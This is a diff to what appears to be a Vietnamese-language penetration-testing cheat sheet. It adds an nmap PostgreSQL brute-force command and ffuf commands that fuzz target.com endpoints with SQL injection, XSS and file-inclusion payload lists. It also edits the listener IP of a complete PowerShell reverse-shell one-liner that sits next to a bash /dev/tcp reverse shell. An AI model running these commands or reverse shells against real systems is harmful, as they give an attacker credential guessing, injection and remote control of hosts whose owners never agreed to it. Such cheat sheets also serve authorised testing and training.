@@ -318,6 +318,9 @@ nmap -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 192.168
 
 # PostgreSQL enumeration
 nmap -p 5432 --script=postgresql-info 192.168.1.1
+
+# PostgreSQL bruteforce
+nmap -p 5432 --script=pgsql-brute 192.168.1.1
 ```
 
 ### 1.2.10. LDAP Enumeration
@@ -666,6 +669,45 @@ ffuf -w params.txt -u http://target.com/script.php?FUZZ=value
 
 # Fuzzing với POST requests
 ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -d "username=admin&password=FUZZ" -u http://target.com/login
+
+# Sử dụng danh sách các payload SQL Injection
+ffuf -w /path/to/sqli-payloads.txt -u https://target.com/endpoint?id=FUZZ -fr "không tìm thấy"
+
+# Sử dụng danh sách các payload XSS
+ffuf -w /path/to/xss-payloads.txt -u https://target.com/endpoint?q=FUZZ -mr "FUZZ"
+
+# Fuzzing tham số GET
+ffuf -w /path/to/params.txt:PARAM -w /path/to/values.txt:VAL -u https://target.com/endpoint?PARAM=VAL
+
+# Fuzzing tham số POST
+ffuf -w /path/to/params.txt:PARAM -w /path/to/values.txt:VAL -u https://target.com/endpoint -X POST -d "PARAM=VAL"
+
+# Phát hiện Local File Inclusion
+ffuf -w /path/to/lfi-payloads.txt -u https://target.com/endpoint?file=FUZZ -fr "không tìm thấy"
+
+# Điều chỉnh số luồng
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -t 50
+
+# Lọc theo kích thước phản hồi
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -fs 4242
+
+# Lọc theo từ khóa trong phản hồi
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -fr "không tìm thấy"
+
+# Lọc theo mã trạng thái HTTP
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -fc 404,403
+
+# Thêm User-Agent
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -H "User-Agent: Mozilla/5.0"
+
+# Thêm Cookie
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -H "Cookie: session=1234567"
+
+# Timeout (5 giây)
+ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -timeout 5
+
+# Quét các API endpoint với header JSON
+ffuf -w /path/to/api-endpoints.txt -u https://target.com/api/FUZZ -H "Content-Type: application/json" -X POST -d '{"key":"value"}'
 ```
 
 ## 2.2. Technology Stack Identification
@@ -6015,7 +6057,7 @@ IEX ($a+$b)
 
 ```bash
 # PowerShell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.168',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # Bash
 bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
